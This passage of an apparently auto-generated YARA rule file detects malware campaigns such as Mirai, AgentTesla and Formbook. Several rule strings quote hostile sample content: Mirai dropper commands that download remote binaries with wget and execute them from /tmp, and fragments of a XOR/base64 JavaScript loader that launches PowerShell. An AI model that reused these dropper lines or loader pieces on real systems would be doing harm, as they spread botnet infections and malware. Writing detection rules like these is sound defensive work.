        $s11 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_8be5d863_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8be5d863"
        date = "2026-10-28"
        campaign = "tlsh-8be5d863"
        family = "mirai"
        hash = "0d23bcb2e85eba59d7b40cdaef8ad8290834caf4ac00260f567cf5d037e78932"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8be5d863.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/dev/FTWDT101_watchdog" ascii
        $s1 = "/dev/FTWDT101/watchdog" ascii
        $s2 = "/etc/default/watchdog" ascii
        $s3 = "/dev/misc/watchdog0" ascii
        $s4 = "/dev/misc/watchdog1" ascii
        $s5 = "/dev/misc/watchdog2" ascii
        $s6 = "/dev/earlywatchdog" ascii
        $s7 = "/dev/mbox/watchdog" ascii
        $s8 = "/dev/epdc/watchdog" ascii
        $s9 = "/dev/ssp/watchdog" ascii
        $s10 = "/dev/extwatchdog" ascii
        $s11 = "/dev/fw/watchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a63e7b96_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a63e7b96"
        date = "2026-10-28"
        campaign = "tlsh-a63e7b96"
        family = "mirai"
        hash = "075661075b4e05b4d770af74b7a21378c258e58c1925e08858c3fd4d9ee4de4b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a63e7b96.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/dev/FTWDT101_watchdog" ascii
        $s1 = "/dev/FTWDT101/watchdog" ascii
        $s2 = "/etc/default/watchdog" ascii
        $s3 = "/dev/misc/watchdog0" ascii
        $s4 = "/dev/misc/watchdog1" ascii
        $s5 = "/dev/misc/watchdog2" ascii
        $s6 = "/dev/earlywatchdog" ascii
        $s7 = "/dev/mbox/watchdog" ascii
        $s8 = "/dev/epdc/watchdog" ascii
        $s9 = "/dev/ssp/watchdog" ascii
        $s10 = "/dev/extwatchdog" ascii
        $s11 = "/dev/fw/watchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_f3e5588e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-f3e5588e"
        date = "2026-10-28"
        campaign = "dotnet_typelib_guid-f3e5588e"
        family = ""
        hash = "0d11c4b0ed5b1235e2ab8aa7ab41302acd686617a007157278eb4e58847ab2b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-f3e5588e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <!--<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>-->" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" ascii
        $s5 = "      <!-- If your application is designed to work with Windows 7, uncomment the following supported" ascii
        $s6 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" ascii
        $s7 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" ascii
        $s8 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s9 = "            Specifying requestedExecutionLevel node will disable file and registry virtualization." ascii
        $s10 = "ll automatically select the most compatible environment.-->" ascii
        $s11 = "      <!-- A list of all Windows versions that this application is designed to work with. Windows wi" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1714176 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_1d2d4d62_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-1d2d4d62"
        date = "2026-10-28"
        campaign = "dotnet_typelib_guid-1d2d4d62"
        family = "agenttesla"
        hash = "1216a457ad6feba882414c1d842764b2ef56b281cc6d73248732a8b5f96cf37f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-1d2d4d62.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "-NuclearControl.PlantForm+<ReadPixelBytes>d__6" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "<MashlmutaHandoverQuality>k__BackingField" ascii
        $s4 = "<MshakhnaSupervisorOversight>k__BackingField" ascii
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s6 = "System.Collections.Generic.IEnumerator<System.Byte>.get_Current" ascii
        $s7 = "System.Collections.Generic.IEnumerable<System.Byte>.GetEnumerator" ascii
        $s8 = "Operator Shift & Human Factors Configuration" wide
        $s9 = "System.Collections.Generic.IEnumerator<System.Byte>.Current" ascii
        $s10 = "Nuclear Performance & Operations Summary Report" wide
        $s11 = "<DukhranaShiftPosition>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2668544 and 12 of them
}

rule Sightlines_tlsh_2f0b689c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2f0b689c"
        date = "2026-10-28"
        campaign = "tlsh-2f0b689c"
        family = "mirai"
        hash = "0f3c4dc91223d718577c8337ed7c03ef77097b992a78ffed87eea5f03e1bda78"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2f0b689c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s1 = "/dev/FTWDT101_watchdog" ascii
        $s2 = "/dev/FTWDT101/watchdog" ascii
        $s3 = "/etc/default/watchdog" ascii
        $s4 = "/dev/misc/watchdog0" ascii
        $s5 = "/dev/misc/watchdog1" ascii
        $s6 = "/dev/misc/watchdog2" ascii
        $s7 = "/dev/earlywatchdog" ascii
        $s8 = "/dev/mbox/watchdog" ascii
        $s9 = "/dev/epdc/watchdog" ascii
        $s10 = "/dev/ssp/watchdog" ascii
        $s11 = "/dev/extwatchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_e26e8f19_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e26e8f19"
        date = "2026-10-28"
        campaign = "tlsh-e26e8f19"
        family = "mirai"
        hash = "1f715216367cfdb4e397d42e9fa665d783c182eaf2abc4f57310b04dd07ea846"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e26e8f19.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/dev/FTWDT101_watchdog" ascii
        $s1 = "/dev/FTWDT101/watchdog" ascii
        $s2 = "/etc/default/watchdog" ascii
        $s3 = "/dev/misc/watchdog0" ascii
        $s4 = "/dev/misc/watchdog1" ascii
        $s5 = "/dev/misc/watchdog2" ascii
        $s6 = "/dev/earlywatchdog" ascii
        $s7 = "/dev/mbox/watchdog" ascii
        $s8 = "/dev/epdc/watchdog" ascii
        $s9 = "/dev/ssp/watchdog" ascii
        $s10 = "/dev/extwatchdog" ascii
        $s11 = "/dev/fw/watchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_b6078609_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b6078609"
        date = "2026-10-28"
        campaign = "tlsh-b6078609"
        family = "mirai"
        hash = "184dd31e9615abd7861e1e1304289d346b55fd4e99da524219c7a0404edc551a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b6078609.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/dev/FTWDT101_watchdog" ascii
        $s1 = "/dev/FTWDT101/watchdog" ascii
        $s2 = "/etc/default/watchdog" ascii
        $s3 = "/dev/misc/watchdog0" ascii
        $s4 = "/dev/misc/watchdog1" ascii
        $s5 = "/dev/misc/watchdog2" ascii
        $s6 = "/dev/earlywatchdog" ascii
        $s7 = "/dev/mbox/watchdog" ascii
        $s8 = "/dev/epdc/watchdog" ascii
        $s9 = "/dev/ssp/watchdog" ascii
        $s10 = "/dev/extwatchdog" ascii
        $s11 = "/dev/fw/watchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_26d94a58_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-26d94a58"
        date = "2026-10-28"
        campaign = "tlsh-26d94a58"
        family = "mirai"
        hash = "1db0ce93704bde6b3eb5c7aaaa95cfb6cd1883c737c801822a1f4fb923b58ad3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-26d94a58.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/dev/FTWDT101_watchdog" ascii
        $s1 = "/dev/FTWDT101/watchdog" ascii
        $s2 = "qVcVf(@Vg= Vhm#Vi}&Vj" ascii
        $s3 = "/etc/default/watchdog" ascii
        $s4 = "/dev/misc/watchdog0" ascii
        $s5 = "/dev/misc/watchdog1" ascii
        $s6 = "/dev/misc/watchdog2" ascii
        $s7 = "/dev/earlywatchdog" ascii
        $s8 = "/dev/mbox/watchdog" ascii
        $s9 = "/dev/epdc/watchdog" ascii
        $s10 = "/dev/ssp/watchdog" ascii
        $s11 = "/dev/extwatchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ea72baa7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ea72baa7"
        date = "2026-10-28"
        campaign = "tlsh-ea72baa7"
        family = ""
        hash = "5d8dd29325e39d8721b47ce814c4875a30bbaef34844354b1888fa08661d92d2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ea72baa7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ShortcutDirectory_TargetHotkeyIcon_IconIndexShowCmdWkDirDisplayResourceDLLDisplayResourceIdDescripti" ascii
        $s1 = "MediaDiskIdLastSequenceDiskPromptCabinetVolumeLabelSource#cab1.cabAdminUISequenceActionConditionSequ" ascii
        $s2 = "SearchPropertySignature_UpgradeUpgradeCodeVersionMinVersionMaxLanguageAttributesRemoveActionProperty" ascii
        $s3 = "ypeStartTypeErrorControlLoadOrderGroupDependenciesStartNamePasswordArgumentsComponent_DescriptionApp" ascii
        $s4 = "enceCostInitializeFileCostCostFinalizeExecuteActionErrorMessageServiceInstallNameDisplayNameServiceT" ascii
        $s5 = "onResourceDLLDescriptionResourceIdInstallExecuteSequenceValidateProductIDInstallValidateInstallIniti" ascii
        $s6 = "alizeProcessComponentsUnpublishFeaturesRemoveRegistryValuesWriteRegistryValuesRegisterUserRegisterPr" ascii
        $s7 = "Installation Database" ascii
        $s8 = " !#+7DMNPUYadg{}" wide
        $s9 = "SummaryInformation" wide
        $s10 = "efdDfge$ghfDhig" ascii
        $s11 = "STRDTUS$UVTDVWU" ascii
    condition:
        filesize < 9125888 and 12 of them
}

rule Sightlines_tlsh_1eb94f42_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1eb94f42"
        date = "2026-10-28"
        campaign = "tlsh-1eb94f42"
        family = ""
        hash = "58fa049941575e3f9918517d570a458dd0abc5fcc09a8b5745e0cf8615da932f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1eb94f42.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "::<Ka1@@AMc2\\\\]SRUOd3YYZVVY^^_ZZ]EX,<N(cF1001eegQQS,,-{{|xxyN9)OOP88:Qf5JJNR;*Q8&&6" ascii
        $s1 = "Ri5HHITk6JJKFFHQh4CCEUm7>>@AACLLMEEFbab_`aFZ.Pf3H\\0334667MMP<<=cceUUWJ^0\"0" ascii
        $s2 = "org/newsclub/net/unix/AFUNIXSocketChannel$$Lambda$1.classPK" ascii
        $s3 = "org/newsclub/net/unix/AFUNIXSocketChannel$$Lambda$2.classPK" ascii
        $s4 = "org/newsclub/net/unix/AFUNIXServerSocket$$Lambda$1.classPK" ascii
        $s5 = "org/newsclub/net/unix/AFUNIXServerSocket$$Lambda$2.classPK" ascii
        $s6 = "org/newsclub/net/unix/AFUNIXServerSocket$$Lambda$3.classPK" ascii
        $s7 = "org/newsclub/net/unix/AFUNIXServerSocket$$Lambda$4.classPK" ascii
        $s8 = "org/newsclub/net/unix/AFUNIXServerSocket$$Lambda$5.classPK" ascii
        $s9 = "org/newsclub/net/unix/AFUNIXServerSocket$$Lambda$6.classPK" ascii
        $s10 = "org/newsclub/net/unix/AFSYSTEMSocketAddress$1$$Lambda$2.classPK" ascii
        $s11 = "org/newsclub/net/unix/AFUNIXSelectorProvider$1$$Lambda$3.classPK" ascii
    condition:
        filesize < 11392318 and 12 of them
}

rule Sightlines_c2_ddaf44fb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-ddaf44fb"
        date = "2026-10-28"
        campaign = "c2-ddaf44fb"
        family = "mirai"
        hash = "088f7e3da839bfee33ea19a4bdcd940603ef7cfde33c5e116444931a048cc094"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-ddaf44fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel realtek; wget http://%s" ascii
        $s1 = " /tmp; wget http://%s/mipsel; chmod 777 mipsel; ./mipsel netis.netcore; wget http://%s/armv4l; chmod" ascii
        $s2 = "cd /tmp || cd /dev wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " ascii
        $s3 = "/armv4l; chmod 777 armv4l; ./armv4l realtek; " ascii
        $s4 = " 777 armv4l; ./armv4l netis.netcore; " ascii
        $s5 = "/usr/sbin/NetworkManager" ascii
        $s6 = "Connection: keep-alive" ascii
        $s7 = "[0mNo shell available" ascii
        $s8 = "/usr/sbin/dbus-daemon" ascii
        $s9 = "/bin/busybox ftpget" ascii
        $s10 = "[0mAccess granted!" ascii
        $s11 = "[0mWrong password!" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_tlsh_a02e3fd7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a02e3fd7"
        date = "2026-10-28"
        campaign = "tlsh-a02e3fd7"
        family = ""
        hash = "0dd2bc546cd4648d98c9d79e2e87810cb215bbff35b163edb71e75e10423cb4c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a02e3fd7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "var blaahvillingerneap = Forsumpkulturplan.replace(/^\\s+|\\s+$/g, \"\");" ascii
        $s1 = "var Abdikationensfarveindg = Pterygospinouscybern.indexOf(\"Uptwined\");" ascii
        $s2 = "var Suiogothicafkristningern = String.fromCharCode(15029);" ascii
        $s3 = "var Sekstalletakkumula = Untombedsportivesvmmeha.concat(\"Contes63\",\"Flleskort\");" ascii
        $s4 = "var Recusinghyalogenmisva = 4993630 >> 5491448;" ascii
        $s5 = "var Turnabletroppai = Misstylingnatriure13.concat(\"Dancingly\",\"Rasper\");" ascii
        $s6 = "var Silkepudlenscoh = Advertisingcongl.slice(1,7); " ascii
        $s7 = "var Atelestitejernbanerge = String.fromCharCode(15822);" ascii
        $s8 = "var Underskrevnesbjancafa = Overlbsfilerrovs.concat(\"Unpuckers\",\"Jilted\");" ascii
        $s9 = "var Sumph179 = \"Herluf; milieubeskyttelseslovgivningens\";" ascii
        $s10 = "//Annotation37. bathymetric? tofagsvinduets114," ascii
        $s11 = "var Proklamaetspillefrdigek = Aviseredesslatifyingb.charAt(5);" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_7afad890_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7afad890"
        date = "2026-10-28"
        campaign = "tlsh-7afad890"
        family = "mirai"
        hash = "2dcc3fbd2cfb5a1141c3de2879129a9e0bc1ed8e004bee91db28815e5c6ccf10"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7afad890.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s3 = "HOST: 255.255.255.255:1900" ascii
        $s4 = "MAN: \"ssdp:discover\"" ascii
        $s5 = "M-SEARCH * HTTP/1.1" ascii
        $s6 = "service:service-agent" ascii
        $s7 = "objectClass0" ascii
        $s8 = "TeamSpeak" ascii
        $s9 = " default" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_2099d4d6_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2099d4d6"
        date = "2026-10-28"
        campaign = "tlsh-2099d4d6"
        family = "formbook"
        hash = "1177b841f4fa387601d7abcd88439594ad58b361b090a79764152525f75378c0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2099d4d6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "mCAsjIRkTdE0NKgt2GwQaDTp4DwxaCBIuJmB1LysKCQNcfhYqOhwAMSpTVywTCnMoIxYGPiIvUSgCPwkAEBRufQIVeFgzH3UAaRR" ascii
        $s1 = "    var PAYLOAD_B64   = \"c2U0ZyUyJC9pbXB5DhBieBg1U3IVbQl5EAp0axEcUVobEQkAEBRufQIVeFgzH3UAaRRwZxQGcXE" ascii
        $s2 = "xN3t8aW1weQ4QYngYNVNyFW0JeRAKdGsRHFFaGxEJABAUbn0CFXhYMx91AH0RLzQNEQMZNBoJEWNuDnE9KQcmHCZaIx9+bzkJHQU" ascii
        $s3 = "wZxQGcXExN3t8aW1weQ4QYngYNVNyFW0JeRAKdGsRHFFaGxEJABAUbn0CFXhYMx91AGkUcGcUBnFxMTd7fGltcHkOEGJ4GDVTchV" ascii
        $s4 = "oCQsEDys4CAtRFwcWCU0ME24wHhJ4BjEcdFBjFxI1HgUQLzhQAXBacRI2BHcYKSsmCzscQHs0GQYWPiIlDQspBnhWES0YPggVEVE" ascii
        $s5 = "    // STAGE 3: XOR (equivalent to XorDecryptor.decrypt)" ascii
        $s6 = "    // STAGE 9: top-level workflow (equivalent to WorkflowOrchestrator)" ascii
        $s7 = "                \"SELECT * FROM Win32_Process WHERE Name='powershell.exe' OR Name='pwsh.exe'\"" ascii
        $s8 = "    function runPowerShellAndWait(shell, fs, scriptPath) {" ascii
        $s9 = "            var doc = makeActiveX(\"MSXML2.DOMDocument.6.0\");" ascii
        $s10 = "        var innerB64 = xorDecode(xorCipher, XOR_KEY);" ascii
        $s11 = "    function killPowerShellByPath(scriptPath) {" ascii
    condition:
        filesize < 5538146 and 12 of them
}

rule Sightlines_tlsh_45aa0ce1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-45aa0ce1"
        date = "2026-10-28"
        campaign = "tlsh-45aa0ce1"
        family = ""
        hash = "01d48402275e46466877c2ae87ae260de693f378412c26042785b0f2f83f7a1b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-45aa0ce1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "start \"zapret2: %~n0\" /min \"%BIN%winws2.exe\" --wf-tcp-out=80,443,2053,2083,2087,2096,8443,%GameFilte" ascii
        $s1 = "  --payload=discord_ip_discovery,stun --lua-desync=fake:blob=ACTIVE_DISCORD_UDP:repeats=6 --new ^" ascii
        $s2 = "--filter-tcp=2053,2083,2087,2096,8443 --hostlist-domains=discord.media --out-range=-d10 ^" ascii
        $s3 = "rTCP% --wf-udp-out=443,19294-19344,50000-50100,%GameFilterUDP% ^" ascii
        $s4 = "--blob=ACTIVE_GAME_UDP:@\"%BIN%ACTIVE_GAME_UDP.bin\" ^" ascii
        $s5 = "--blob=ACTIVE_DISCORD_UDP:@\"%BIN%ACTIVE_DISCORD_UDP.bin\" ^" ascii
        $s6 = "--filter-tcp=443 --hostlist=\"%LISTS%list-google.txt\" --out-range=-d10 ^" ascii
        $s7 = "--filter-tcp=80,443,8443 --ipset=\"%LISTS%ipset-all.txt\" --hostlist-exclude=\"%LISTS%list-exclude.txt\"" ascii
        $s8 = "--filter-tcp=80,443 --hostlist=\"%LISTS%list-general.txt\" --hostlist=\"%LISTS%list-general-user.txt\" -" ascii
        $s9 = "  --payload=quic_initial --lua-desync=fake:blob=quic_initial_www_google_com:repeats=6 --new ^" ascii
        $s10 = "--filter-udp=%GameFilterUDP% --ipset=\"%LISTS%ipset-all.txt\" --ipset-exclude=\"%LISTS%ipset-exclude.tx" ascii
        $s11 = "t-exclude=\"%LISTS%ipset-exclude-user.txt\" --out-range=-d10 ^" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1502332a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1502332a"
        date = "2026-10-28"
        campaign = "tlsh-1502332a"
        family = ""
        hash = "0f033a5a67ee7f6ea267e5677ca43b02accdf79e576db01ad13ef892346dfd3c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1502332a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "start \"zapret2: %~n0\" /min \"%BIN%winws2.exe\" --wf-tcp-out=80,443,2053,2083,2087,2096,8443,%GameFilte" ascii
        $s1 = "  --payload=discord_ip_discovery,stun --lua-desync=fake:blob=ACTIVE_DISCORD_UDP:repeats=6 --new ^" ascii
        $s2 = "  --payload=unknown --lua-desync=fake:blob=ACTIVE_GAME_UDP:repeats=12:payload=known,unknown" ascii
        $s3 = "--filter-tcp=2053,2083,2087,2096,8443 --hostlist-domains=discord.media --out-range=-d10 ^" ascii
        $s4 = "rTCP% --wf-udp-out=443,19294-19344,50000-50100,%GameFilterUDP% ^" ascii
        $s5 = "--blob=ACTIVE_GAME_UDP:@\"%BIN%ACTIVE_GAME_UDP.bin\" ^" ascii
        $s6 = "--blob=ACTIVE_DISCORD_UDP:@\"%BIN%ACTIVE_DISCORD_UDP.bin\" ^" ascii
        $s7 = "--filter-tcp=443 --hostlist=\"%LISTS%list-google.txt\" --out-range=-d10 ^" ascii
        $s8 = "--filter-tcp=80,443,8443 --ipset=\"%LISTS%ipset-all.txt\" --hostlist-exclude=\"%LISTS%list-exclude.txt\"" ascii
        $s9 = "--filter-tcp=80,443 --hostlist=\"%LISTS%list-general.txt\" --hostlist=\"%LISTS%list-general-user.txt\" -" ascii
        $s10 = "  --payload=quic_initial --lua-desync=fake:blob=quic_initial_www_google_com:repeats=6 --new ^" ascii
        $s11 = "  --payload=http_req --lua-desync=fake:blob=fake_default_http:repeats=6:tcp_ts=-600000 --new ^" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_8530c0b5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8530c0b5"
        date = "2026-10-28"
        campaign = "tlsh-8530c0b5"
        family = ""
        hash = "050f000ac9f1f2b730569bf6818b3cb3340a8afa6b8ef517184aec7d050571c8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8530c0b5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "start \"zapret: %~n0\" /min \"%BIN%winws.exe\" --wf-tcp=80,443,2053,2083,2087,2096,8443,%GameFilter% --w" ascii
        $s1 = "--filter-tcp=2053,2083,2087,2096,8443 --hostlist-domains=discord.media --dpi-desync=hostfakesplit --" ascii
        $s2 = "esync-fake-unknown-udp=\"%BIN%quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2" ascii
        $s3 = "--filter-tcp=80,443,%GameFilter% --ipset=\"%LISTS%ipset-all.txt\" --hostlist-exclude=\"%LISTS%list-excl" ascii
        $s4 = "--filter-tcp=80,443 --hostlist=\"%LISTS%list-general.txt\" --hostlist-exclude=\"%LISTS%list-exclude.txt" ascii
        $s5 = "--filter-udp=443 --hostlist=\"%LISTS%list-general.txt\" --hostlist-exclude=\"%LISTS%list-exclude.txt\" -" ascii
        $s6 = "--filter-tcp=443 --hostlist=\"%LISTS%list-google.txt\" --ip-id=zero --dpi-desync=hostfakesplit --dpi-d" ascii
        $s7 = "-desync-fooling=ts,md5sig --dpi-desync-hostfakesplit-mod=host=ozon.ru --new ^" ascii
        $s8 = "-quic=\"%BIN%quic_initial_www_google_com.bin\" --new ^" ascii
        $s9 = "--filter-udp=443 --ipset=\"%LISTS%ipset-all.txt\" --hostlist-exclude=\"%LISTS%list-exclude.txt\" --ipset" ascii
        $s10 = "-exclude=\"%LISTS%ipset-exclude.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=" ascii
        $s11 = "\" --ipset-exclude=\"%LISTS%ipset-exclude.txt\" --dpi-desync=hostfakesplit --dpi-desync-repeats=4 --dpi" ascii
    condition:
        filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_da606a67_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-da606a67"
        date = "2026-10-28"
        campaign = "tlsh-da606a67"
        family = ""
        hash = "021e15101f6ed2849d206a37d841fdd138a65938d17881e2defe9c415705b039"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-da606a67.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "start \"zapret2: %~n0\" /min \"%BIN%winws2.exe\" --wf-tcp-out=80,443,2053,2083,2087,2096,8443,%GameFilte" ascii
        $s1 = "  --payload=unknown --lua-desync=fake:blob=ACTIVE_GAME_UDP:repeats=10:payload=known,unknown" ascii
        $s2 = "--filter-tcp=2053,2083,2087,2096,8443 --hostlist-domains=discord.media --out-range=-d10 ^" ascii
        $s3 = "rTCP% --wf-udp-out=443,19294-19344,50000-50100,%GameFilterUDP% ^" ascii
        $s4 = "--blob=ACTIVE_GAME_UDP:@\"%BIN%ACTIVE_GAME_UDP.bin\" ^" ascii
        $s5 = "--blob=ACTIVE_DISCORD_UDP:@\"%BIN%ACTIVE_DISCORD_UDP.bin\" ^" ascii
        $s6 = "--filter-tcp=443 --hostlist=\"%LISTS%list-google.txt\" --out-range=-d10 ^" ascii
        $s7 = "--filter-tcp=80,443,8443 --ipset=\"%LISTS%ipset-all.txt\" --hostlist-exclude=\"%LISTS%list-exclude.txt\"" ascii
        $s8 = "  --payload=quic_initial --lua-desync=fake:blob=quic_initial_www_google_com:repeats=11 --new ^" ascii
        $s9 = "--filter-tcp=80,443 --hostlist=\"%LISTS%list-general.txt\" --hostlist=\"%LISTS%list-general-user.txt\" -" ascii
        $s10 = "--filter-udp=%GameFilterUDP% --ipset=\"%LISTS%ipset-all.txt\" --ipset-exclude=\"%LISTS%ipset-exclude.tx" ascii
        $s11 = "t-exclude=\"%LISTS%ipset-exclude-user.txt\" --out-range=-d10 ^" ascii
    condition:
        filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_6f1864ec_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6f1864ec"
        date = "2026-10-28"
        campaign = "tlsh-6f1864ec"
        family = ""
        hash = "0d0a21cd2129901ddcedebe2c5f5a4245d589ba605dd523cbc880775607c5d68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6f1864ec.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "start \"zapret2\" /min \"%~dp0bin\\winws2.exe\" \"--wf-tcp-out\" \"80,443,2053,2083,2087,2096,8443\" \"--wf-tc" ascii
        $s1 = "tasklist /FI \"IMAGENAME eq winws.exe\" /NH 2>nul | findstr /I \"winws.exe\" >nul" ascii
        $s2 = "    echo ERROR: Zapret 1 is running - stop winws.exe first." ascii
        $s3 = "if not errorlevel 1 (" ascii
        $s4 = "@echo off" ascii
    condition:
        filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_8c367799_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8c367799"
        date = "2026-10-28"
        campaign = "tlsh-8c367799"
        family = ""
        hash = "6279822b2a2ad409014ec7271272a974581360ae95ef8707895e134daa5ecba0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8c367799.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_advapi32.LookupPrivilegeValueW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(_LUID" ascii
        $s1 = "    _fields_ = [(\"PrivilegeCount\", ctypes.c_ulong), (\"Privileges\", _LUID_AND_ATTRIBUTES * 1)]" ascii
